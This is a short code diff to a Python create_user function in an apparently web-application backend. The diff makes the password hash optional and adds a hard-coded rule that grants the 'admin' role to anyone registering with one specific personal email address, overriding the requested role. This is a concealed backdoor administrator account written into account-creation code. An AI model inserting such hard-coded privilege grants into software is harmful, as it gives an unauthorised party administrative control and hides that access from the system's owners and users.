@@ -20,11 +20,13 @@ def create_user(
     db: Session,
     *,
     email: str,
-    hashed_password: str,
+    hashed_password: str | None,
     full_name: str | None,
     role: str,
     investment_interests: list[str] | None = None,
 ) -> User:
+    if email.lower() == "abhiramabhat2005@gmail.com":
+        role = "admin"
     user = User(
         email=email.lower(),
         hashed_password=hashed_password,
